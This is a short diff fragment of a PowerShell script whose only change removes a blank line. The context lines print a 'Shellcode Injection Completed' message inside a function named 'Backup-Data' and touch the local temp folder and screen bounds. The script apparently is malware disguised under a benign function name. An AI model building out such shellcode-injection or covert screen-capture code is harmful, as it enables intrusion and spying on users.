@@ -1046,7 +1046,6 @@ function Backup-Data {
     $proc.WaitForExit()
     Write-Host "[!] Shellcode Injection Completed" -ForegroundColor Green
 
-
     $main_temp = "$env:localappdata\temp"
 
     $top = ($screen.Bounds.Top | Measure-Object -Minimum).Minimum
